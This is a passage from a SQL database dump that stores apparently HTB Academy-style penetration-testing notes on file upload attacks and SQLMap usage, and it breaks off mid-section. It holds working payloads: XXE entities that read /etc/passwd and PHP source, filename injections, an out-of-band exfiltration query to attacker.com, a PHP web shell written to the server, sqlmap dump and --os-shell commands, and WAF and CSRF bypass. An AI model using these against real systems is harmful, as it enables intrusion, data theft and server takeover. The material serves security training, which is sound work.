When the server parses this SVG (for display, thumbnail generation, etc.), the XML parser reads `/etc/passwd` and inserts its content into the SVG. The file contents are returned in the page or page source — exposing all user accounts on the system.

**XXE payload to read PHP source code:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

**Breakdown:**
- `php://filter/convert.base64-encode/resource=index.php` — Uses PHP''s filter wrapper (same as in LFI) to base64-encode the content of `index.php` before including it
- The base64-encoded source code of `index.php` appears in the SVG output
- Decode it with `echo ''<base64>'' | base64 -d` to get the original source

This is extremely valuable for whitebox analysis: reading source code reveals the upload directory, allowed extensions, file naming scheme, and other vulnerabilities to exploit.

**XXE in other document types:**

XXE is not exclusive to SVG. Other document types that contain XML internally:
- **PDF** — Uses XML-based metadata
- **Word Documents (.docx)** — DOCX is a ZIP archive containing XML files
- **PowerPoint (.pptx)** — Also XML-based internally
- **Excel (.xlsx)** — Also XML-based

If the web application has a document viewer that is vulnerable to XXE and allows uploading these document types, we can modify their internal XML data to include malicious XXE elements and achieve blind XXE attacks (data exfiltration without direct output).

Similarly, XXE can be chained into **SSRF (Server-Side Request Forgery)** by using external entity URLs pointing to internal services:

```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
```

This can enumerate internal ports and call private APIs.

---

### DoS

**Denial of Service (DoS)** attacks via file uploads target the server''s resources — CPU, memory, disk space, or network — to crash or significantly slow down the back-end server. These do not require code execution; they abuse the server''s file processing functionality.

**Attack 1 — Decompression Bomb (ZIP Bomb):**

If the web application automatically unzips uploaded ZIP archives (e.g., to process them or extract files), a **decompression bomb** can be devastating. A decompression bomb is a ZIP file containing nested ZIP archives. When unzipped recursively, the total decompressed data expands to petabytes — far exceeding the server''s available disk space or memory and causing a crash.

For example: a 1 KB ZIP file may decompress to 1 PB of data when fully extracted (using highly compressed repeated data and nested archives).

**Attack 2 — Pixel Flood Attack (Image Files):**

Some image formats (JPG, PNG) store their dimensions in the file header. A pixel flood attack creates a normal-looking image file (e.g., 500x500 pixels) but manually edits the dimension values in the compression data to claim a much larger size (e.g., `0xffff x 0xffff` = 65535 x 65535 pixels = ~4.3 gigapixels).

When the web application tries to display or process the image (resize, thumbnail, render), it tries to **allocate memory for 4.3 billion pixels** — exhausting all available RAM and causing the server to crash.

**How to create a pixel flood JPG:**
- Start with any legitimate JPG
- Use a hex editor to change the width/height bytes in the JFIF or SOF header to `0xFF 0xFF` (maximum value)
- The file looks valid but reports a massive resolution

**Attack 3 — Oversized File Upload:**

Some upload forms do not limit the **file size** or do not check size before accepting the upload. Uploading an extremely large file (e.g., several GB) can:
- Fill the server''s hard disk → server crashes or becomes unresponsive
- Exhaust server memory during processing
- Saturate network bandwidth

**Attack 4 — Directory Traversal in File Name:**

If the upload function is vulnerable to **directory traversal** in the filename (e.g., `filename="../../../etc/passwd"`), we may upload files to unexpected locations — potentially overwriting critical system files, causing the server to malfunction or crash.

**Attack 5 — XXE-based DoS:**

The XXE payloads discussed in the previous section (like billion laughs attack or recursive entity references) can exhaust the XML parser''s memory and CPU, causing a DoS when the server processes the uploaded file.

---

## Other Upload Attacks

In addition to arbitrary file uploads and limited file upload attacks, there are several other techniques worth knowing that may become relevant in specific web penetration tests or bug bounty programs.

---

### Injections in File Name

A common file upload attack uses a **malicious string for the uploaded file name** itself — injecting code or commands into the filename that gets executed or processed if the web application uses the filename in an unsafe way (e.g., passing it to an OS command, displaying it in HTML, or using it in a database query).

**1. Command Injection via File Name:**

If the web application uses the uploaded file name in an OS command (e.g., to move, rename, or process the file), a malicious file name can inject additional commands:

**Malicious file names:**
- `file$(whoami).jpg` — Uses shell command substitution `$(...)`. If used in a bash command like `mv file$(whoami).jpg /tmp/`, bash evaluates `$(whoami)` and executes the `whoami` command
- `` file`whoami`.jpg `` — Backtick command substitution — same effect as `$()`
- `file.jpg||whoami` — Command chaining with `||` (OR). If the first command fails, `whoami` executes
- `file.jpg;whoami` — Command chaining with `;`. Executes `whoami` after the first command regardless of success/failure

**Example vulnerable server code (pseudo):**

```bash
mv $uploaded_file_name /var/www/html/uploads/
```

If `$uploaded_file_name` is `file$(whoami).jpg`, bash expands this to:

```bash
mv filewww-data.jpg /var/www/html/uploads/
```

And `whoami` was executed as a side effect, giving RCE.

**2. XSS via File Name:**

If the uploaded file name is displayed on the page (e.g., in a file list, download link, or notification), we can inject an XSS payload as the filename:

```
<script>alert(window.origin);</script>.jpg
```

When the application renders the filename in HTML without sanitization, the script tag executes in the victim''s browser.

**3. SQL Injection via File Name:**

If the filename is inserted into a database query without parameterization:

```
file'';select+sleep(5);--.jpg
```

The single quote `''` closes the string in the SQL query, and `select sleep(5)` causes a 5-second delay — confirming SQL injection. More dangerous payloads can dump the database or perform UNION-based extraction.

---

### Upload Directory Disclosure

In some file upload forms (feedback forms, submission forms), we may not have direct access to the uploaded file''s URL and may not know the upload directory. Knowing the upload path is essential for including our shell via LFI or directly visiting the uploaded file.

**Method 1 — Fuzzing:**

Use tools like `ffuf` or `gobuster` to fuzz for common upload directories:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -fc 404
```

Try directories like `/uploads/`, `/files/`, `/media/`, `/images/`, `/user-files/`, `/attachments/`, etc.

**Method 2 — LFI/XXE Source Code Reading:**

As covered in the LFI and Limited File Upload sections, use LFI or XXE to read the web application''s source files (like `config.php` or the main application file). The source code will typically contain the upload directory path as a configured variable or constant.

**Method 3 — Forcing Error Messages:**

Errors often reveal internal paths and directory structures. Techniques to force errors:

- **Upload a file that already exists:** If a file named `profile.jpg` is already in the uploads folder, uploading another file with the same name may cause the server to error out with a message like "Cannot write file to /var/www/html/uploads/profile.jpg" — revealing the full path
- **Send two identical requests simultaneously:** Race condition may cause a write conflict and error revealing the path
- **Upload a file with an extremely long name (e.g., 5000 characters):** If the server does not handle long names, it may throw an error disclosing the upload path

**Method 4 — IDOR (Insecure Direct Object Reference):**

The Web Attacks/IDOR module discusses techniques for finding where files are stored and identifying file naming schemes. Files may be stored with predictable names (e.g., sequential IDs, hashed usernames, timestamps) that allow enumerating other users'' files.

---

### Windows-specific Attacks

When the target web application runs on a **Windows server**, several Windows-specific techniques can be applied to file uploads that exploit Windows''s unique file system behaviors.

**1. Reserved Characters in File Names:**

Windows reserves certain characters for special uses in file paths. If the web application does not sanitize these characters or wrap filenames in quotes when using them in commands, they may cause unexpected behavior:

- `|` (pipe), `<` (redirect in), `>` (redirect out), `*` (wildcard), `?` (single char wildcard)

Example: uploading a file named `shell.php*` or `shell?.php` — the wildcard characters may cause the server to reference unintended files, trigger errors, or disclose path information.

**2. Windows Reserved Device Names:**

Windows reserves certain names as device identifiers that cannot be used as filenames:
`CON`, `PRN`, `AUX`, `NUL`, `COM1`–`COM9`, `LPT1`–`LPT9`

Uploading a file with these names (e.g., `NUL.php`, `CON.txt`) causes Windows to refuse the write operation, potentially triggering error messages that disclose the upload directory path or other server information.

**3. Windows 8.3 Short Filename Convention:**

Older versions of Windows (and still supported in modern Windows for legacy compatibility) used the **8.3 filename format** — 8-character filename + 3-character extension. Long filenames were abbreviated with a tilde (`~`) followed by a number.

**Format:** The first 6 characters of the long name + `~1` (or `~2` for the second matching file) + extension

**Examples:**
- `hackthebox.txt` → `HACKTH~1.TXT`
- `webshell.php` → `WEBSHE~1.PHP`
- `web.conf` → `WEB~1.CON` (if `web.config` exists)

**Attack:** Upload a file named `WEB~1.CON` to overwrite `web.conf`, or use these short names to reference existing files that we want to read or overwrite. This can lead to:
- **Information disclosure** — Errors referencing existing files reveal their names/paths
- **File overwriting** — Overwriting configuration or sensitive files
- **DoS** — Replacing critical server files causes the server to malfunction

---

### Advanced File Upload Attacks

Beyond all the attacks covered in this module, there are more **advanced file upload attacks** that involve automatic file processing performed by the server on uploaded files. Any server-side processing that occurs automatically after upload — without proper security — can be exploited.

**1. Processing Library Vulnerabilities:**

Common file processing libraries may have known public exploits:

- **ffmpeg (AVI upload → XXE)** — A widely-used video processing library. A known vulnerability allows crafting a malicious AVI video file that, when processed by ffmpeg for encoding/transcoding, triggers an XXE attack — exposing server files or performing SSRF
- **ImageMagick (ImageTragick)** — A popular image processing library with historical vulnerabilities (like CVE-2016-3714 "ImageTragick") that allowed RCE via maliciously crafted image files
- **LibreOffice document conversion** — Vulnerabilities in document conversion libraries may allow code execution via maliciously crafted DOCX/ODT files

**2. Auto-processing Attack Surface:**

Any automatic server-side action on uploaded files creates an attack surface:

- **Video encoding** — Converting uploaded videos (e.g., AVI → MP4) may use vulnerable codecs
- **Image compression/resizing** — Thumbnailing images with ImageMagick or PIL/Pillow
- **Archive extraction** — Automatically unzipping uploaded archives (ZIP/TAR) exposes to path traversal in archive entries and decompression bombs
- **File renaming** — Using the original filename in an OS command for renaming
- **Metadata stripping** — Parsing EXIF data may invoke vulnerable parsers
- **PDF processing** — Converting/rendering PDFs may invoke vulnerable readers

**3. Custom Code Vulnerabilities:**

When custom code (not a standard library) processes uploaded files, discovering vulnerabilities requires deeper analysis:
- Reverse engineering the processing logic
- Understanding what functions are called with what inputs
- Identifying where user-controlled data (like the filename or file content) flows into dangerous operations

These advanced attacks require deeper knowledge of the specific libraries and processing pipelines in use. They are typically discovered through:
- Researching CVEs for identified libraries (via Wappalyzer, headers, or source code)
- Reading bug bounty reports for similar applications
- Manual testing with intentionally malformed files targeting specific parsers

**Recommendation:** Regularly read **bug bounty reports** (HackerOne, Bugcrowd) focused on file upload vulnerabilities to stay current with advanced techniques as they are discovered in real-world applications.

---

*End of Notes — File Upload Attacks (Complete)*', NULL, 'PUBLISHED', 'PUBLIC', 54, 'cmvcsa9i0000hidr0sh1y58oz', 'cmvcr40dj0000idhkp489xa3k', to_timestamp(1792403109.042), to_timestamp(1792403109.042), NULL, NULL)
ON CONFLICT ("slug") DO UPDATE SET "title" = EXCLUDED."title", "contentMarkdown" = EXCLUDED."contentMarkdown", "contentHtml" = EXCLUDED."contentHtml", "description" = EXCLUDED."description", "status" = EXCLUDED."status", "updatedAt" = EXCLUDED."updatedAt";
INSERT INTO "Document" ("id", "title", "slug", "description", "contentMarkdown", "contentHtml", "status", "visibility", "readingTimeMin", "categoryId", "authorId", "createdAt", "updatedAt", "publishedAt", "deletedAt")
VALUES ('cmvf2ydk7002kida0nb87vb6j', 'SQLMap Essentials', 'sqlmap-essentials', 'HTB Academy notes on SQLMap covering all injection types, HTTP request handling, output analysis, attack tuning, database enumeration, OS exploitation via file read/write and os-shell, and WAF bypass techniques including tamper scripts, Tor, CSRF bypass, and chunked encoding.', '# SQLMap Essentials

## Table of Contents

1. [What is SQLMap?](#what-is-sqlmap)
2. [SQLMap Installation](#sqlmap-installation)
3. [Supported Databases](#supported-databases)
4. [Supported SQL Injection Types](#supported-sql-injection-types)
   * [4.1 Boolean-Based Blind](#boolean-based-blind)
   * [4.2 Error-Based](#error-based)
   * [4.3 Union Query-Based](#union-query-based)
   * [4.4 Stacked Queries](#stacked-queries)
   * [4.5 Time-Based Blind](#time-based-blind)
   * [4.6 Inline Queries](#inline-queries)
   * [4.7 Out-of-Band](#out-of-band)
5. [Basic Usage — Getting Started](#basic-usage--getting-started)
   * [5.1 Help Menus](#help-menus)
   * [5.2 Basic Scan](#basic-scan)
6. [Running SQLMap on HTTP Requests](#running-sqlmap-on-http-requests)
   * [6.1 Using cURL Commands](#using-curl-commands)
   * [6.2 GET Parameters](#get-parameters)
   * [6.3 POST Parameters](#post-parameters)
   * [6.4 Full HTTP Request from File](#full-http-request-from-file)
   * [6.5 Custom Cookies and Headers](#custom-cookies-and-headers)
7. [SQLMap Output — Understanding Log Messages](#sqlmap-output--understanding-log-messages)
   * [7.1 Key Log Messages Explained](#key-log-messages-explained)
8. [Handling SQLMap Errors](#handling-sqlmap-errors)
   * [8.1 Display DBMS Errors](#display-dbms-errors)
   * [8.2 Store All Traffic](#store-all-traffic)
   * [8.3 Increase Verbosity](#increase-verbosity)
   * [8.4 Route Traffic Through a Proxy](#route-traffic-through-a-proxy)
9. [Attack Tuning](#attack-tuning)
   * [9.1 Prefix and Suffix](#prefix-and-suffix)
   * [9.2 Level and Risk](#level-and-risk)
   * [9.3 Specifying Technique](#specifying-technique)
   * [9.4 UNION Tuning](#union-tuning)
10. [Database Enumeration with SQLMap](#database-enumeration-with-sqlmap)
    * [10.1 Basic Information](#basic-information)
    * [10.2 List All Tables](#list-all-tables)
    * [10.3 Dump a Table](#dump-a-table)
    * [10.4 Dump Specific Columns](#dump-specific-columns)
    * [10.5 Dump Specific Rows](#dump-specific-rows)
    * [10.6 Conditional Filtering](#conditional-filtering)
    * [10.7 Dump Entire Database](#dump-entire-database)
    * [10.8 View Database Schema](#view-database-schema)
    * [10.9 Search for Specific Tables or Columns](#search-for-specific-tables-or-columns)
    * [10.10 Password Cracking](#password-cracking)
11. [OS Exploitation via SQLMap](#os-exploitation-via-sqlmap)
    * [11.1 Check DBA Privileges](#check-dba-privileges)
    * [11.2 Read Local Files](#read-local-files)
    * [11.3 Write Files to Server](#write-files-to-server)
    * [11.4 Get an Interactive OS Shell](#get-an-interactive-os-shell)
12. [Bypassing Web Application Protections](#bypassing-web-application-protections)
    * [12.1 Anti-CSRF Token Bypass](#anti-csrf-token-bypass)
    * [12.2 Unique Value Parameter Bypass](#unique-value-parameter-bypass)
    * [12.3 Calculated Parameter Bypass](#calculated-parameter-bypass)
    * [12.4 IP Concealment](#ip-concealment)
    * [12.5 WAF Bypass](#waf-bypass)
    * [12.6 Tamper Scripts](#tamper-scripts)
    * [12.7 Chunked Transfer Encoding](#chunked-transfer-encoding)
    * [12.8 HTTP Parameter Pollution](#http-parameter-pollution)
13. [Advanced Database Enumeration](#advanced-database-enumeration)
    * [13.1 Full Automation](#full-automation)


## What is SQLMap?

SQLMap is a **free, open-source penetration testing tool** written in Python that automates the entire process of detecting and exploiting SQL injection vulnerabilities. Instead of manually crafting injection payloads and analyzing responses, SQLMap does it all automatically — it tests the target, identifies the injection type, and then extracts data from the database. It has been continuously developed since 2006 and remains one of the most powerful tools in a security tester''s toolkit.

SQLMap is not just a simple scanner. It includes a powerful detection engine, supports all known SQL injection types, and has dozens of options to fine-tune attacks, bypass protections, and work with complex HTTP requests. It can also interact with the server''s file system and even give you a remote OS shell in ideal conditions.


## SQLMap Installation

SQLMap comes pre-installed on security-focused Linux distributions like Kali Linux and Parrot OS. For other systems, it can be installed in two ways:

**Install via package manager (Debian/Ubuntu):**

```bash
sudo apt install sqlmap
```

`sudo` runs the command with administrator privileges. `apt install sqlmap` downloads and installs SQLMap from the official Linux software repository. After this, you can run `sqlmap` directly from any terminal.

**Install manually from GitHub:**

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

`git clone` downloads the entire SQLMap project from GitHub into a folder called `sqlmap-dev`. The `--depth 1` flag means only download the latest version of the code, not the full history — this makes the download faster and smaller.

**Run SQLMap after manual install:**

```bash
python sqlmap.py
```

`python sqlmap.py` runs the main SQLMap script using Python. On some systems you may need `python3 sqlmap.py` if Python 3 is not the default.

---

## Supported Databases

SQLMap supports the largest number of database systems of any SQL injection tool. This includes MySQL, Oracle, PostgreSQL, Microsoft SQL Server, SQLite, IBM DB2, MariaDB, Sybase, and many more — over 30 database systems in total. This wide support means SQLMap can be used against almost any web application regardless of the back-end database being used.

---

## Supported SQL Injection Types

SQLMap can detect and exploit all known types of SQL injection. View them with:

```bash
sqlmap -hh
```

`sqlmap -hh` shows the **advanced help menu** with every available option and switch. The basic help is `sqlmap -h`. The extra `h` unlocks the full list. The supported injection techniques are abbreviated as **BEUSTQ**:

| Letter | Type |
|--------|------|
| B | Boolean-based blind |
| E | Error-based |
| U | Union query-based |
| S | Stacked queries |
| T | Time-based blind |
| Q | Inline queries |

### Boolean-Based Blind

```sql
AND 1=1
```

SQLMap sends queries with conditions that are either TRUE or FALSE and observes how the server response changes. If the page looks normal for `AND 1=1` (true) and different for `AND 1=2` (false), data can be extracted one bit at a time. This requires around 7–8 requests per character extracted. It is the **most common** SQLi type found in real applications.

### Error-Based

```sql
AND GTID_SUBSET(@@version, 0)
```

If the application returns SQL error messages in the browser, those errors can be deliberately triggered to carry actual database data inside the error text. This technique is **faster** than boolean-based blind because it can retrieve up to 200 bytes of data per request (called a "chunk").

### Union Query-Based

```sql
UNION ALL SELECT 1, @@version, 3
```

The attacker extends the original query with a `UNION SELECT` statement. If the page displays query results, the injected data appears directly. This is the **fastest** type — in ideal conditions, an entire table can be dumped in a single request.

### Stacked Queries

```sql
; DROP TABLE users
```

Multiple SQL statements are run one after another using a semicolon. This is also called "piggy-backing." It requires the database platform to support stacked queries — Microsoft SQL Server and PostgreSQL support it by default, but MySQL generally does not allow it through typical query execution paths. Useful for running `INSERT`, `UPDATE`, or `DELETE` statements.

### Time-Based Blind

```sql
AND 1=IF(2>1, SLEEP(5), 0)
```

Like boolean-based, but instead of observing page content changes, the attacker measures **response delay**. If `SLEEP(5)` causes a 5-second delay, the condition was true. This is used when the page looks identical regardless of the injected condition — much slower than other types.

### Inline Queries

```sql
SELECT (SELECT @@version) FROM ...
```

A query is embedded inside another query. This is uncommon because it requires the web application to be written in a specific way. SQLMap supports it, but you will rarely encounter it in practice.

### Out-of-Band

```sql
LOAD_FILE(CONCAT(''\\\\'', @@version, ''.attacker.com\\README.txt''))
```

Used when no other method works or everything else is too slow. The database is forced to make a DNS lookup to a domain controlled by the attacker. The requested subdomain contains the extracted data (e.g., `5.7.33.attacker.com`). SQLMap collects these DNS requests to piece together the full response.

---

## Basic Usage — Getting Started

### Help Menus

```bash
sqlmap -h      # Basic help — most commonly used options
sqlmap -hh     # Advanced help — every single option and switch
```

`-h` shows a short summary of the most important flags. `-hh` shows everything, including advanced tuning, evasion, and output options. New users should browse `-hh` at least once to understand what SQLMap can do.

### Basic Scan

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

`-u` (or `--url`) specifies the target URL to scan. SQLMap will test the `id` parameter for SQL injection. `--batch` means run in non-interactive mode — automatically accept all default choices without asking the user for input. This is useful for scripted or automated scans. Without `--batch`, SQLMap pauses and asks questions during the scan.

---

## Running SQLMap on HTTP Requests

### Using cURL Commands

The easiest way to set up SQLMap with the correct headers, cookies, and parameters is to copy the request from your browser:

1. Open Developer Tools (F12) → Network tab
2. Right-click the request → **Copy as cURL**
3. Paste into terminal and replace `curl` with `sqlmap`

```bash
sqlmap ''http://www.example.com/?id=1'' \
  -H ''User-Agent: Mozilla/5.0 ...'' \
  -H ''Accept: */*'' \
  -H ''Connection: keep-alive''
```

`-H` adds a custom HTTP header to every request SQLMap sends. This is important for mimicking a real browser request, especially when the server checks the `User-Agent` or requires specific headers to function correctly.

### GET Parameters

```bash
sqlmap -u "http://www.example.com/page.php?id=1"
```

Parameters in the URL after `?` are GET parameters. SQLMap automatically detects and tests them. The `id=1` part is the parameter being tested.

### POST Parameters

```bash
sqlmap ''http://www.example.com/'' --data ''uid=1&name=test''
```

`--data` specifies POST body data (like form submissions). Both `uid` and `name` will be tested. To test only a specific parameter, add `-p uid`. To mark one specific parameter for testing, use `*`:

```bash
sqlmap ''http://www.example.com/'' --data ''uid=1*&name=test''
```

The `*` after `uid=1*` tells SQLMap to focus injection attempts on the `uid` parameter specifically, ignoring `name`.

### Full HTTP Request from File

Capture a full HTTP request in Burp Suite, save it to a file (`req.txt`), and use it:

```bash
sqlmap -r req.txt
```

`-r` loads the complete raw HTTP request from a file. This is the best approach for complex requests with many headers, cookies, or a large POST body. You can also mark injection points with `*` inside the saved file (e.g., `/?id=*`).

### Custom Cookies and Headers

```bash
sqlmap ... --cookie=''PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c''
```

`--cookie` sets the HTTP cookie header. This is essential when the vulnerable page requires you to be logged in — without the session cookie, SQLMap would just get a login redirect instead of the actual vulnerable page.

```bash
sqlmap ... --random-agent
```

`--random-agent` replaces SQLMap''s default User-Agent header (which many firewalls recognize and block) with a randomly chosen browser User-Agent from a large database. This simple switch helps avoid detection by WAFs and security tools.

```bash
sqlmap -u "www.target.com" --data=''id=1'' --method PUT
```

`--method` forces SQLMap to use the specified HTTP method (GET, POST, PUT, DELETE, etc.) instead of auto-detecting it. Some APIs use PUT or DELETE methods instead of standard GET/POST.

---

## SQLMap Output — Understanding Log Messages

### Key Log Messages Explained

**"target URL content is stable"** — The page returns consistent responses for the same request. This is important because SQLMap compares responses to detect injection; unstable pages add noise.

**"GET parameter ''id'' appears to be dynamic"** — Changing the parameter value changes the page response, which suggests the parameter is actually used in a database query. Static parameters that always return the same content are unlikely to be injectable.

**"heuristic (basic) test shows GET parameter ''id'' might be injectable"** — SQLMap intentionally sent a malformed value and got a database error back. This is a strong hint that injection is possible, but not final proof yet.

**"it looks like the back-end DBMS is ''MySQL''. Do you want to skip test payloads specific for other DBMSes?"** — SQLMap identified the database type. Answering `Y` narrows the remaining tests to MySQL-specific payloads only, making the scan significantly faster.

**"GET parameter ''id'' is vulnerable"** — SQLMap has confirmed the parameter is injectable. The scan found a working payload. At this point SQLMap asks if you want to test other parameters too.

**"sqlmap identified the following injection point(s)"** — The final summary showing all confirmed injection points with their type, technique, and the exact working payload used.

**"fetched data logged to text files under ''/home/user/.sqlmap/output/''"** — All results are saved to disk. The session data is also stored here so future runs against the same target can skip already-completed steps.

---

## Handling SQLMap Errors

### Display DBMS Errors

```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" --parse-errors
```

`--parse-errors` tells SQLMap to extract and display any SQL error messages returned by the server. Instead of hiding them, you see the exact MySQL error text. This helps you understand what is going wrong with the injection and fix your approach.

### Store All Traffic

```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

`-t /tmp/traffic.txt` saves every HTTP request and response that SQLMap sends and receives to the specified file. You can then open the file and manually read through the raw traffic to diagnose issues — seeing exactly what was sent and what came back.

### Increase Verbosity

```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

`-v` sets the verbosity level from 0 (silent) to 6 (maximum detail). Level 6 prints every HTTP request and response directly in the terminal in real time. Level 3 shows payloads being tested. Higher verbosity is very useful for debugging but produces a lot of output.

### Route Traffic Through a Proxy

```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" --proxy="http://127.0.0.1:8080"
```

`--proxy` routes all of SQLMap''s traffic through the specified proxy (commonly Burp Suite running on `127.0.0.1:8080`). This lets you inspect, modify, and replay every request SQLMap makes using Burp''s full feature set — very useful for manual analysis alongside automated testing.

---

## Attack Tuning

### Prefix and Suffix

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%''))" --suffix="-- -"
```

`--prefix` and `--suffix` add text before and after every injection payload. This is needed in rare cases where the vulnerable parameter is inside a complex SQL structure like nested parentheses or function calls. For example, if the query is `WHERE id LIKE ((''$input''))`, you need `%''))` as a prefix to close the extra parentheses before your UNION payload.

### Level and Risk

```bash
sqlmap -u "www.example.com/?id=1" --level=5 --risk=3
```

`--level` controls how many **boundaries** (prefix/suffix combinations) are tested. Ranges from 1 (default, fastest) to 5 (all boundaries, slowest). Higher level catches edge cases that default level misses.

`--risk` controls how **aggressive/dangerous** the payloads are. Ranges from 1 (default, safe) to 3 (includes OR-based payloads that could modify database data). Higher risk is needed for login pages and other forms where OR-based injection is required, but it could accidentally trigger `DELETE` or `UPDATE` in vulnerable queries.

At default `--level=1 --risk=1`, SQLMap tests up to 72 payloads per parameter. At maximum `--level=5 --risk=3`, this increases to 7,865 payloads.

### Specifying Technique

```bash
sqlmap -u "www.example.com/?id=1" --technique=BEU
```

`--technique` restricts SQLMap to only specific injection types. `BEU` means only test Boolean-based blind, Error-based, and Union-based. This is useful when time-based blind is causing timeouts or false positives, or when you already know what type works and want faster results.

### UNION Tuning

```bash
sqlmap -u "www.example.com/?id=1" --union-cols=17
```

`--union-cols` manually tells SQLMap the exact number of columns in the vulnerable query. Normally SQLMap finds this automatically, but if auto-detection fails or you already know the number, specifying it directly speeds things up and avoids incorrect guesses.

```bash
sqlmap -u "www.example.com/?id=1" --union-char=''a''
```

`--union-char` replaces the default dummy values (NULL and random integers) in UNION payloads with the specified character. Some queries reject NULL values or numbers in certain column positions — using `''a''` as a string placeholder can fix compatibility issues.

---

## Database Enumeration with SQLMap

### Basic Information

```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

This single command retrieves four important pieces of basic information simultaneously:

- `--banner` → runs `VERSION()` to get the database version string (e.g., `MySQL 5.1.41`)
- `--current-user` → runs `CURRENT_USER()` to get the logged-in database username
- `--current-db` → runs `DATABASE()` to get the currently selected database name
- `--is-dba` → checks if the current user has DBA (administrator) rights — returns True or False

### List All Tables

```bash
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

`--tables` tells SQLMap to enumerate and list all table names in the database. `-D testdb` specifies which database to look in. Without `-D`, SQLMap lists tables from the current database only.

### Dump a Table

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

`--dump` extracts and prints all data from the specified table. `-T users` specifies the table name. `-D testdb` specifies the database. The output is formatted as a table in the console and also saved as a CSV file on your local machine under `~/.sqlmap/output/`.

### Dump Specific Columns

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

`-C name,surname` tells SQLMap to only retrieve the specified columns instead of all columns. Useful when a table has many columns but you only care about specific ones (like username and password).

### Dump Specific Rows

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

`--start=2` and `--stop=3` limit the output to rows 2 through 3 (by their order in the table). This avoids dumping thousands of rows from large tables when you only need a sample or specific range.

### Conditional Filtering

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE ''f%''"
```

`--where` adds a SQL `WHERE` condition to filter which rows are retrieved. `name LIKE ''f%''` means only get rows where the name starts with the letter `f`. This is the SQLMap equivalent of adding `WHERE name LIKE ''f%''` to a manual SQL query.

### Dump Entire Database

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D testdb
```

Omitting `-T` dumps **all tables** in the specified database at once. All data from every table is retrieved and saved.

```bash
sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs
```

`--dump-all` dumps everything from every database. `--exclude-sysdbs` skips built-in system databases like `information_schema`, `mysql`, and `performance_schema` since they contain MySQL internals rather than application data.

### View Database Schema

```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```

`--schema` retrieves the complete structure of all databases — every table and every column with its data type. This gives you a full blueprint of the entire database without extracting the actual data yet. Useful for planning what to dump.

### Search for Specific Tables or Columns

```bash
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

`--search -T user` searches for all table names containing the keyword `user` (using the SQL `LIKE` operator). SQLMap will find `users`, `user_accounts`, `admin_users`, etc. across all databases.

```bash
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

`--search -C pass` searches for columns containing `pass` in their name across all tables and databases. This quickly finds password columns like `password`, `passwd`, `pass_hash`, etc.

### Password Cracking

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

When SQLMap dumps a table and finds values that look like password hashes, it automatically offers to crack them using a dictionary attack. SQLMap supports cracking 31 different hash types and comes with a built-in wordlist of 1.4 million common passwords. The cracking runs in parallel using all available CPU cores.

```bash
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

`--passwords` specifically targets the MySQL system table that stores database user password hashes (not application passwords). These are the credentials used to log into the database itself. SQLMap retrieves and attempts to crack them automatically.

---

## OS Exploitation via SQLMap

### Check DBA Privileges

```bash
sqlmap -u "http://www.example.com/?id=1" --is-dba
```

`--is-dba` checks whether the current database user has DBA (Database Administrator) privileges. Returns `True` or `False`. DBA privileges are usually required to read and write files on the server through SQL injection.

### Read Local Files

```bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

`--file-read` uses MySQL''s `LOAD_FILE()` function to read any file from the server''s file system that the MySQL process has permission to access. The file content is downloaded and saved locally at `~/.sqlmap/output/<target>/files/`. The `/etc/passwd` file in Linux contains system user account information.

### Write Files to Server

```bash
echo ''<?php system($_GET["cmd"]); ?>'' > shell.php
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

`echo ''...'' > shell.php` creates a PHP web shell file on your local machine first. `--file-write "shell.php"` specifies the local file to upload. `--file-dest "/var/www/html/shell.php"` specifies where to write it on the remote server. SQLMap uses `SELECT INTO OUTFILE` to write the file. The `secure_file_priv` variable must allow writes to that path.

### Get an Interactive OS Shell

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

`--os-shell` is SQLMap''s most powerful feature — it attempts to give you a full interactive command shell on the remote server. SQLMap first tries to write a web shell using `INTO OUTFILE`, then interacts with it. If that doesn''t work, it may use MySQL User-Defined Functions (UDFs) to execute OS commands directly through the database engine.

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```

Adding `--technique=E` restricts SQLMap to error-based injection for the OS shell attempt. If UNION-based gives no output, error-based often works better because it has cleaner data extraction paths. SQLMap will also auto-detect the web language (PHP, ASP, etc.) and find the web root directory.

---

## Bypassing Web Application Protections

### Anti-CSRF Token Bypass

```bash
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=abc123" --csrf-token="csrf-token"
```

`--csrf-token="csrf-token"` tells SQLMap the name of the anti-CSRF token parameter. Before each request, SQLMap fetches a fresh page, extracts the new token value, and includes it in the next injection request. This bypasses applications that require a valid CSRF token with every form submission.

### Unique Value Parameter Bypass

```bash
